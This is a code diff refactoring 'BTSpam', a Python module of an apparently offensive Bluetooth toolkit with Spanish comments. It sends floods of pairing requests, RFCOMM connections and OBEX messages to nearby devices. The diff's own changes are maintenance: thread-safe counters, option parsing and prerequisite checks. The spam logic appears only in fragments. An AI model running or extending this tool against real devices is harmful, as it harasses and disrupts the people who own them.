@@ -15,12 +15,9 @@ import os
 import sys
 import time
 import random
-import struct
 import threading
 import subprocess
 from typing import Dict, List, Optional, Tuple
-from datetime import datetime
-from pathlib import Path
 
 from bluesky.core.engine import BaseModule
 
@@ -66,24 +63,8 @@ def _is_wsl() -> bool:
 def _get_adapter_mac() -> str:
     """Obtiene la MAC del adaptador Bluetooth local."""
     if _is_windows():
-        try:
-            import subprocess
-            result = subprocess.run(
-                ["powershell", "-Command",
-                 "(Get-PnpDevice -Class Bluetooth | Select-Object -First 1).FriendlyName"],
-                capture_output=True, text=True, timeout=5
-            )
-            if result.returncode == 0:
-                return "local"
-        except Exception:
-            pass
-        try:
-            import asyncio
-            from bleak import BleakScanner
-            # Solo para verificar que bleak funciona
-            return "local"
-        except ImportError:
-            return "local"
+        # En Windows no exponemos la MAC aquí; basta saber que hay adaptador.
+        return "local"
     elif _is_linux():
         try:
             result = subprocess.run(
@@ -151,6 +132,7 @@ class BTSpam(BaseModule):
     def __init__(self, target: str = "", options: dict = None):
         super().__init__(target, options)
         self._stop_flag = threading.Event()
+        self._stats_lock = threading.Lock()
         self._stats = {
             "pairing_sent": 0,
             "obex_sent": 0,
@@ -174,12 +156,12 @@ class BTSpam(BaseModule):
     def run(self):
         """Ejecuta el ataque de spam Bluetooth contra uno o todos los dispositivos."""
         target = self.target
-        method = self.options.get("METHOD", "all").lower()
-        rate = int(self.options.get("RATE", "10"))
+        method = str(self.options.get("METHOD") or "all").lower()
+        rate = self._opt_int("RATE", 10)
         message = self.options.get("MESSAGE", "👽 bluesky Spam!")
-        count = int(self.options.get("COUNT", "50"))
-        duration = int(self.options.get("DURATION", "30"))
-        delay = int(self.options.get("DELAY", "100")) / 1000.0
+        count = self._opt_int("COUNT", 50)
+        duration = self._opt_int("DURATION", 30)
+        delay = self._opt_int("DELAY", 100) / 1000.0
 
         # ── STEP 0: Mostrar pasos ────────────────────────────────────
         self.result["data"]["steps"] = list(self.STEPS)
@@ -243,7 +225,7 @@ class BTSpam(BaseModule):
                 t.join(timeout=duration + 10)
 
             self.result["success"] = True
-            self.result["data"]["stats"] = dict(self._stats)
+            self.result["data"]["stats"] = self._stats_snapshot()
             self.result["data"]["targets_hit"] = list(self._stats["targets_hit"])
             self.result["data"]["message"] = self._format_summary(methods)
 
@@ -320,7 +302,7 @@ class BTSpam(BaseModule):
                 name = device_names.get(mac, "Unknown")
                 hit_with_names.append({"mac": mac, "name": name})
 
-            self.result["data"]["stats"] = dict(self._stats)
+            self.result["data"]["stats"] = self._stats_snapshot()
             self.result["data"]["targets_hit"] = list(self._stats["targets_hit"])
             self.result["data"]["targets_hit_detail"] = hit_with_names
             self.result["data"]["message"] = self._format_summary(methods)
@@ -385,11 +367,11 @@ class BTSpam(BaseModule):
                         capture_output=True, text=True, timeout=2
                     )
 
-                self._stats["pairing_sent"] += 1
-                self._stats["targets_hit"].add(target)
+                self._stat_inc("pairing_sent")
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
@@ -415,15 +397,15 @@ class BTSpam(BaseModule):
                         s.settimeout(0.5)
                         s.connect((target, channel))
                         s.close()
-                        self._stats["connections_made"] += 1
+                        self._stat_inc("connections_made")
                     except Exception:
                         pass
 
-                self._stats["pairing_sent"] += 1
-                self._stats["targets_hit"].add(target)
+                self._stat_inc("pairing_sent")
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
@@ -513,14 +495,14 @@ class BTSpam(BaseModule):
                     pass
 
                 if success:
-                    self._stats["obex_sent"] += 1
+                    self._stat_inc("obex_sent")
                 else:
-                    self._stats["errors"] += 1
+                    self._stat_inc("errors")
 
-                self._stats["targets_hit"].add(target)
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
@@ -562,11 +544,11 @@ class BTSpam(BaseModule):
                     pass
                 s.close()
 
-                self._stats["obex_sent"] += 1
-                self._stats["targets_hit"].add(target)
+                self._stat_inc("obex_sent")
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
@@ -618,11 +600,11 @@ class BTSpam(BaseModule):
                     capture_output=True, text=True, timeout=2
                 )
 
-                self._stats["connections_made"] += 3
-                self._stats["targets_hit"].add(target)
+                self._stat_inc("connections_made", 3)
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
@@ -653,16 +635,42 @@ class BTSpam(BaseModule):
                     except Exception:
                         continue
 
-                self._stats["connections_made"] += 1
-                self._stats["targets_hit"].add(target)
+                self._stat_inc("connections_made")
+                self._stat_hit(target)
 
             except Exception:
-                self._stats["errors"] += 1
+                self._stat_inc("errors")
 
             iterations += 1
             time.sleep(delay)
 
     # ─── Utilidades ───────────────────────────────────────────────────────
+
+    def _stat_inc(self, key: str, amount: int = 1) -> None:
+        """Incrementa un contador de _stats de forma thread-safe.
+
+        Los hilos de ataque (uno por target×técnica) actualizan los
+        contadores concurrentemente; el lock evita lost updates del
+        read-modify-write no atómico.
+        """
+        with self._stats_lock:
+            self._stats[key] += amount
+
+    def _stat_hit(self, target: str) -> None:
+        """Registra un target impactado de forma thread-safe."""
+        with self._stats_lock:
+            self._stats["targets_hit"].add(target)
+
+    def _stats_snapshot(self) -> Dict:
+        """Snapshot serializable de las estadísticas (sin sets)."""
+        with self._stats_lock:
+            return {
+                "pairing_sent": self._stats["pairing_sent"],
+                "obex_sent": self._stats["obex_sent"],
+                "connections_made": self._stats["connections_made"],
+                "errors": self._stats["errors"],
+                "targets_hit": list(self._stats["targets_hit"]),
+            }
 
     def _scan_and_prompt(self) -> dict:
         """Escanea dispositivos disponibles y sugiere targets."""
@@ -780,7 +788,7 @@ class BTSpam(BaseModule):
 
     def _format_summary(self, methods: List[str]) -> str:
         """Formatea resumen del ataque."""
-        stats = self._stats
+        stats = self._stats_snapshot()
         lines = [
             "═══════════════════════════════════════════",
             "  📊 BTSpam - Resumen del ataque",
@@ -808,6 +816,7 @@ class BTSpam(BaseModule):
 
     def check_prerequisites(self) -> Tuple[bool, str]:
         """Verifica que haya Bluetooth disponible."""
+        import shutil
         if _is_windows():
             try:
                 import socket
@@ -817,10 +826,7 @@ class BTSpam(BaseModule):
             except Exception:
                 return True, "Windows Bluetooth disponible (limitado a emparejados)"
         elif _is_linux():
-            missing = []
-            for cmd in ["bluetoothctl"]:
-                if not subprocess.run(["which", cmd], capture_output=True).returncode == 0:
-                    missing.append(cmd)
+            missing = [cmd for cmd in ["bluetoothctl"] if not shutil.which(cmd)]
             if missing:
                 return True, f"Herramientas faltantes: {', '.join(missing)}. Algunas funciones pueden no estar disponibles."
             return True, ""
